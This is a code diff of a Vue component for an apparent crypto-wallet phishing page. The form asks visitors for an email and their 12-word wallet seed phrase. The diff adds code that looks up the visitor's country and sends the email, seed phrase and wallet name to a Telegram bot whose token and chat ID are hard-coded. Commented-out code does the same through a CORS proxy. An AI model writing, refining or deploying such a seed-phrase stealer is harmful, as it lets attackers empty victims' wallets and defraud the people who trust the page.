@@ -20,11 +20,19 @@
         <form @submit.prevent="handleSubmit">
           <div class="email">
             <div class="label">Email Address :</div>
-            <input type="email" placeholder="Enter Email" v-model="email" />
+            <input
+              id="eMail"
+              type="email"
+              placeholder="Enter Email"
+              v-model="email"
+              value="person@email.com"
+            />
           </div>
           <h3 class="small">Wallet 12 Seed Phrase:</h3>
           <div class="inputs">
             <input
+              class="sPhrase"
+              value="Juice world"
               v-for="(word, index) in seedPhrase"
               :key="index"
               type="text"
@@ -41,64 +49,115 @@
 
 <script setup>
 import { useWalletStore } from '@/stores/walletStore'
-import { computed, reactive } from 'vue'
+import { computed, reactive, onMounted } from 'vue'
 import { useRoute } from 'vue-router'
 
-// Access route parameters
 const route = useRoute()
 const id = route.params.id
 
-// Wallet store
 const walletStore = useWalletStore()
+let walletName
 
-// Compute the wallet title based on the ID
+onMounted(() => {
+  // console.log('otf')
+  // console.log('Wallet Title:', walletTitle.value)
+  walletName = walletTitle.value
+})
+
 const walletTitle = computed(() => {
   const wallet = walletStore.wallets.find((w) => w.id === parseInt(id))
   return wallet ? wallet.title : null
 })
 
-// Form state
 const formState = reactive({
   email: '',
-  seedPhrase: Array(12).fill(''), // 12 seed phrase words
+  seedPhrase: Array(12).fill(''),
 })
 
-// Telegram Bot Token and Chat ID
-const BOT_TOKEN = 'HTTP API:7640674458:AAHG635XLcWfDc0HbiXx4xpqmzubixdsERk'
+const BOT_TOKEN = '7640674458:AAHG635XLcWfDc0HbiXx4xpqmzubixdsERk'
 const CHAT_ID = '5300909464'
 
-// Handle form submission
-const handleSubmit = () => {
-  const message = `
-    🛡️ *Wallet Authentication Form Submitted* 🛡️
-    - 📧 *Email:* ${formState.email}
-    - 🔑 *Wallet Title:* ${walletTitle.value || 'N/A'}
-    - 🔢 *Seed Phrase:*
-      ${formState.seedPhrase.map((word, index) => `${index + 1}: ${word}`).join('\n')}
-  `
+const handleSubmit = async (e) => {
+  e.preventDefault()
 
-  // Send the message to Telegram
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message,
-      parse_mode: 'Markdown', // Makes the message bold and formatted
-    }),
-  })
-    .then((response) => response.json())
-    .then((data) => {
-      console.log('Telegram response:', data)
-      alert('Message sent successfully!')
+  let country
+
+  await fetch('https://ipapi.co/country_name/')
+    .then((response) => response.text())
+    .then((countryName) => {
+      country = countryName
     })
-    .catch((error) => {
-      console.error('Telegram error:', error)
-      alert('Failed to send message.')
+
+  const eMail = document.getElementById('eMail')
+  let sPhraseArray = []
+  const sPhrase = document.getElementsByClassName('sPhrase')
+  for (let i = 0; i < sPhrase.length; i++) {
+    let phrase = `${1 + i}. ${sPhrase[i].value} \n`
+    sPhraseArray = [...sPhraseArray, phrase]
+  }
+
+  let message = `Email: ${eMail.value}\nCountry: ${country}\nWallet Name: ${walletName}\nSeed phrase:\n`
+  for (const sp of sPhraseArray) {
+    message += `${sp}\n`
+  }
+
+  message = encodeURI(message)
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`
+  try {
+    await fetch(url).then((res) => {
+      if (res.ok) {
+        console.log('success!')
+        console.log(decodeURI(message))
+        eMail.value = ''
+        for (let i = 0; i < sPhrase.length; i++) {
+          sPhrase[i].value = ''
+        }
+      }
     })
+  } catch (e) {
+    console.error(`Error: ${e}`)
+  }
+
+  // console.log('Email:', formState.email)
+  // console.log('Seed Phrase:', formState.seedPhrase)
+
+  // console.log('Email:', eMail.value)
+  // console.log('Seed Phrase:', sPhrase)
+
+  /*
+
+  // const message = `
+  //   🛡️ *Wallet Authentication Form Submitted* 🛡️
+  //   - 📧 *Email:* ${formState.email}
+  //   - 🔑 *Wallet Title:* ${walletTitle.value || 'N/A'}
+  //   - 🔢 *Seed Phrase:*
+  //     ${formState.seedPhrase.map((word, index) => `${index + 1}: ${word}`).join('\n')}
+  // `
+
+  // const proxyUrl = 'https://cors-anywhere.herokuapp.com/'
+  // const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`
+
+  // fetch(proxyUrl + telegramUrl, {
+  //   method: 'POST',
+  //   headers: { 'Content-Type': 'application/json' },
+  //   body: JSON.stringify({
+  //     chat_id: CHAT_ID,
+  //     text: message,
+  //     parse_mode: 'Markdown',
+  //   }),
+  // })
+  //   .then((response) => response.json())
+  //   .then((data) => {
+  //     console.log('Telegram response:', data)
+  //     alert('Message sent successfully!')
+  //   })
+  //   .catch((error) => {
+  //     console.error('Telegram error:', error)
+  //     alert('Failed to send message.')
+  //   })
+  */
 }
 
-// Destructure form state for template binding
 const { email, seedPhrase } = formState
 </script>
 
